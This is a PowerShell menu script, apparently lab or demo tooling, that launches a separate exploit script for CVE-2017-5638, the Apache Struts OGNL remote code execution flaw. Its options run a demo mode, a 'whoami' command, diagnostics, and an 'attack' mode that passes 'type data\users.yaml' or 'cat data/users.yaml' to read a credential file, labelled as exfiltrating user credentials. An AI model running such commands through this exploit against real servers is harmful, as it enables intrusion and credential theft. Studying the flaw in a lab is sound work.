<#
MIT License

Copyright (c) 2026 Allen

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
#>

While ($true) {
    $Host.UI.RawUI.FlushInputBuffer()
    Write-Host "Select an option:"
    Write-Host "0: Run in safe demo mode (no real exploit)"
    Write-Host "1: Run with whoami command"
    Write-Host "a: Run with attacking and hack password"
    Write-Host "d: Run diagnostics (find which OGNL step fails)"
    Write-Host "e: Exit"
    $s = Read-Host "option"
    switch ($s.Trim()) {
        '0' {
            Write-Host "Running in safe demo mode...`n"
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -DemoMode
        }
        '1' {
            Write-Host "Running with whoami command...`n"
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command "whoami"
        }
        'a' {
            Write-Host "Running attack script - exfiltrating user credentials...`n"
            # Use the OS-native read command so the JVM shell can execute it.
            #   Windows cmd.exe uses 'type' with backslash paths.
            #   Linux/macOS sh uses 'cat' with forward-slash paths.
            $readCmd = if ($IsWindows) { 'type data\users.yaml' } else { 'cat data/users.yaml' }
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command $readCmd
        }
        'd' {
            Write-Host "`n=== DIAGNOSTIC: Running levels 1-13 ===" -ForegroundColor Magenta
            Write-Host "Each level adds one step. First failure reveals the problem.`n" -ForegroundColor Magenta
            for ($lvl = 1; $lvl -le 13; $lvl++) {
                Write-Host "--- Diagnostic level $lvl ---" -ForegroundColor Magenta
                & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -DiagLevel $lvl
                Write-Host ""
            }
        }
        'e' {
            Write-Host "Exiting...`n"
            exit
        }
        default {
            Write-Host "Invalid choice. Please enter 0, 1, a, d, or e."
        }
    }
}